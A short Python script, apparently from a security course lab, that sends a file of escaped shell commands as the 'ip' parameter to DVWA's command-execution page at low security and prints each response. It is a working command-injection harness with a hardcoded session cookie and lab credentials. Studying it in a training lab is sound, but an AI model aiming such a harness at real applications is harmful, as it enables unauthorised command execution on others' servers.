from bs4 import BeautifulSoup
import requests
import time

with open("escaped_commands.txt") as cfile:
    commands = cfile.readlines()

cookies_jar = requests.cookies.RequestsCookieJar()
cookies_jar.set('PHPSESSID','er8j156t7rn1ccnc7th7dv0ih7')
cookies_jar.set('security','low')

for command in commands:
    command = command.replace('\r','').replace('\n','')
    url = 'http://1.2.3.4/DVWA/vulnerabilities/exec/#'
    params = {'ip': command,'Submit': 'Submit'}
    r = requests.post(url ,params ,auth=('itp270','itp270'), cookies=cookies_jar, )
    parseHTML = BeautifulSoup(r.text, 'html.parser')
    htmlDiv = parseHTML.find('div',{'class': 'vulnerable_code_area'})

    print ("trying %s:\n %s - \nhash: %s\n----------\n" % (url, command, str(htmlDiv)))
    time.sleep(3)
